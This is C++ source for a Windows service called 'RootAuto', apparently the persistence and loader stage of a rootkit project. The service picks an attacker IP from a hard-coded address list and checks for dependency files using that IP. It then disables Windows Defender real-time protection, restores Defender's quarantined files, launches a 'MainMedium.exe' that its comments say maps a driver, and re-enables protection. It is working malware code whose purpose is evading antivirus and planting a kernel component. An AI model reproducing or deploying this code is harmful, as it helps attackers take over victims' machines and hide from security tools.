#include <iostream>
#include <sys/types.h>
#include <sys/stat.h>
#include "helpers.h"
#include "utils.h"
#include "services.h"


// Declerations for used functions -
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);  // actual Main() of service, initiates service operations
VOID WINAPI ServiceControlHandler(DWORD);  // controls events, like IRP_MJ_DEVICE_CONTROL in KM
DWORD WINAPI ServiceMainThread(LPVOID lpParam);  // main thread, actually activates the medium service and maps the driver


DWORD WINAPI ServiceMainThread(LPVOID lpParam)
{
    RETURN_LAST LastErrorSpecial = { 0, 0 };
    int LastError = 0;
    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    const char* CleaningCommands =
        "cd \"%ProgramFiles%\\Windows Defender\" && "
        "MpCmdRun.exe -Restore -All";
    const char* AttackAddresses = "172.25.224.1~172.29.32.1~172.20.32.1~172.20.240.1~172.27.144.1~172.28.112.1~172.17.96.1~192.168.47.1~192.168.5.1~192.168.1.21~172.21.64.1~192.168.56.1";


    // Get IP addresses of target and attacker:
    if (!MatchIpAddresses(TargetIp, AttackerIp, AttackAddresses)) {
        return -1;
    }


    // Make sure that all depended-on files exist on target machine (folders + files):
    LastError = VerfifyDepDirs();
    if (LastError != 0) {
        return LastError;
    }
    LastError = VerfifyDepFiles(AttackerIp);
    if (LastError != 0) {
        return LastError;
    }


    // Disable Realtime Protection:
    LastErrorSpecial = RealTime(TRUE);
    if (LastErrorSpecial.Represent != ERROR_SUCCESS || LastErrorSpecial.LastError != 0) {
        return FALSE;
    }


    // Perform cleaning commands from last iteration:
    if (system(CleaningCommands) == -1) {
        return GetLastError();
    }


    // Activate medium:
    HINSTANCE MediumProcess = ShellExecuteA(NULL, "open", "C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe", NULL, NULL, SW_NORMAL);
    if ((INT_PTR)MediumProcess <= 32) {
        return (DWORD)MediumProcess;
    }


    // Enable Realtime Protection:
    LastErrorSpecial = RealTime(FALSE);
    if (LastErrorSpecial.Represent != ERROR_SUCCESS || LastErrorSpecial.LastError != 0) {
        return FALSE;
    }
    return ERROR_SUCCESS;
}


VOID WINAPI ServiceControlHandler(DWORD CtrlCode)
{
    switch (CtrlCode)
    {
    case SERVICE_CONTROL_STOP:

        if (AutomaticService.ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        AutomaticService.ServiceStatus.dwControlsAccepted = 0;
        AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        AutomaticService.ServiceStatus.dwWin32ExitCode = 0;
        AutomaticService.ServiceStatus.dwCheckPoint = 4;

        SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
        SetEvent(AutomaticService.StopEvent);  // Initiate the stop event - main working thread will be notified to stop working
        break;

    default:
        break;  // No need to handle any other type of events
    }
}


VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
{
    DWORD Status = E_FAIL;

    // Register the service control handler with the SCM so its possible to control the service -
    AutomaticService.StatusHandle = RegisterServiceCtrlHandler(AutomaticService.ServiceName, ServiceControlHandler);
    if(AutomaticService.StatusHandle != NULL) {
        // Initialize service status with values to show service controller the service is starting -
        RtlZeroMemory(&AutomaticService.ServiceStatus, sizeof(AutomaticService.ServiceStatus));
        AutomaticService.ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
        AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // For now, no interaction with the service is accepted
        AutomaticService.ServiceStatus.dwCurrentState = SERVICE_START_PENDING;  // Intending to eventually start
        AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESS
        AutomaticService.ServiceStatus.dwServiceSpecificExitCode = 0;
        AutomaticService.ServiceStatus.dwCheckPoint = 0;

        if (SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus)) {
            AutomaticService.StopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
            if (AutomaticService.StopEvent == NULL) {
                // Error creating the event that occurs when stopping the service (need to stop service manually) -
                AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // For now, no interaction with the service is accepted
                AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOPPED;  // Service has stopped
                AutomaticService.ServiceStatus.dwWin32ExitCode = GetLastError();
                AutomaticService.ServiceStatus.dwCheckPoint = 1;
                SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
            }
            else {
                // Created stopping event successfully, proceed to start the service -
                AutomaticService.ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;  // Only accepted interaction with service is stopping it
                AutomaticService.ServiceStatus.dwCurrentState = SERVICE_RUNNING;  // Service is currently running
                AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESSFUL
                AutomaticService.ServiceStatus.dwCheckPoint = 0;
                if (SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus)) {
                    AutomaticService.MainThread = CreateThread(NULL, 0, ServiceMainThread, NULL, 0, NULL);
                    if (AutomaticService.MainThread != NULL) {
                        WaitForSingleObject(AutomaticService.MainThread, INFINITE);  // Wait for main thread to stop operating
                    }
                    CloseHandle(AutomaticService.StopEvent);  // Stop event not needed anymore

                    // Update final status of service (stopping after main operation) -
                    AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // No interaction with service should occur when stopping
                    AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOPPED;  // Service has stopped operating
                    AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESS
                    AutomaticService.ServiceStatus.dwCheckPoint = 3;
                    SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
                }
            }
        }
    }
    return;
}


int main(int argc, TCHAR* argv[])
{
    char AutoName[11] = "RootAuto";
    WCHAR WideAutoName[MAX_PATH];
    CharpToWcharp(AutoName, WideAutoName);
    AutomaticService.InitiateService(WideAutoName);
    AutomaticService.ServiceFile = "C:\\nosusfolder\\verysus\\AutoService\\AutoStart.exe";

    // Define the service table entry of the auto service (name, entrypoint ..) -
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {AutomaticService.ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };


    // Start the service control dispatcher (used by SCM to call the service) -
    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
        return GetLastError();
    }
    return 0;
}